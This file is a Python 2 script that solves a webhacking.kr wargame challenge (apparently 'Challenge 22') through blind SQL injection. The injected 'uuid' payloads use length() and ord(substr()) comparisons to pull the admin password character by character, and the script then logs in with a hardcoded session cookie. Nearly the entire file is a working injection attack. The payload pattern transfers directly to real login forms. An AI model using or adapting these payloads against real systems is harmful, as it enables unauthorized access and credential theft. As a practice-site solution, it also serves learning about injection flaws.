#-*- coding: utf-8 -*-
import sys
import urllib
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-2/index.php"
print "[*] Verifing admin password length"
passwordLength = 0
isFoundIdLength = False

CookieManager.addCookie("PHPSESSID", "eabcdebaaabceddaabeabddefcabcdbe")

passwordLength=32
parameter = urllib.urlencode({
    "uuid": "admin' and if(length(pw)=%d,1,0) -- " % (passwordLength)
})
httpRequest = urllib2.Request(challengeUrl, parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print "[*] Blind SQL Injection...", passwordLength
    if httpResponse.find("Wrong password!") > 0:
        print "[+] FIND IT! id length is [", passwordLength, "]"
        isFoundIdLength = True
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

if not isFoundIdLength:
    sys.exit(-1)

passwordValue = ""

for caretIndex in range(1, passwordLength+1):
    print
    print "[*] Blind SQL Injection...", caretIndex, "", 
    for charIndex in range(0x61, 0x67) + range(0x30, 0x3A):
        sys.stdout.write(".")
        parameter = urllib.urlencode({
            "uuid": "admin' and if(ord(substr(pw,%d,1))=%d,1,0) -- " % (caretIndex, charIndex)
        })

        httpRequest = urllib2.Request(challengeUrl, parameter)
        httpRequest.add_header("Cookie", CookieManager.getCookie())
        
        httpConnection = None
        try:
            httpConnection = urllib2.urlopen(httpRequest)
            httpResponse = httpConnection.read()
            if httpResponse.find("Wrong password!") > 0:
                print 
                print "[+] FIND IT!", chr(charIndex)
                passwordValue += chr(charIndex)
                break
        except:
            raise
        finally:
            if httpConnection != None:
                httpConnection.close()

print
print "[!] pw is [", passwordValue, "]"
print
print "[*] Clear Challenge 22"
parameters = urllib.urlencode({
    "uuid": "admin", 
    "pw"  : "rainbow"
})
httpRequest = urllib2.Request(challengeUrl, parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
